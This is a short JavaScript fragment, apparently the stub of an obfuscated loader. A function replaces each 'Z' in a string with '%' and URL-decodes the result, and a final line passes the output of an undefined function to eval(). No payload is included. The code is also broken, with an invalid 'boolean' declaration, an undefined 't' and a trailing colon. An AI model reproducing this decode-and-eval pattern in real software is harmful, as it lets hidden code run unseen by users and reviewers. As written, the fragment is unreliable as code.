function replaceZwithCharacter (str) {
  newStr = "";
  for (i = 0; i < str.length; i++) {
    boolean isCharatcterEqualZ = str.charAt(i) == "Z";
    if (isCharatcterEqualZ) {
      replaceCharacter = "%";
    }
    else {
      replaceCharacter = str.charAt(i);
    }
    newStr = newStr + replaceCharacter;
  }
  return unescape(newStr);
}

var x = 0;
eval ( t ( ) ):